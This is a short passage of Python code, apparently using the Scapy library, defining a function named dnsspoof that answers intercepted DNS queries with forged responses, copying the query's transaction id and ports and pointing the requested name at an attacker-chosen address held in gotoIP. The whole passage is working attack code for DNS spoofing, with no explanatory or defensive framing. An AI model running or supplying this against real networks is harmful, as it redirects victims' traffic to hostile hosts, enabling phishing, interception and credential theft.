...
def dnsspoof(rec : IP):
    if rec.haslayer(DNS) and rec.getlayer(DNS).qr==0:
        spoof = (Ether()/ IP(dst=rec[IP].src, src=rec[IP].dst)/UDP(dport=rec[UDP].sport, sport=rec[UDP].dport)/DNS(id=rec[DNS].id, qd=rec[DNS].qd, qr=1,an=DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=rec[DNS].qd.qname, ttl=10, rdata=gotoIP)))
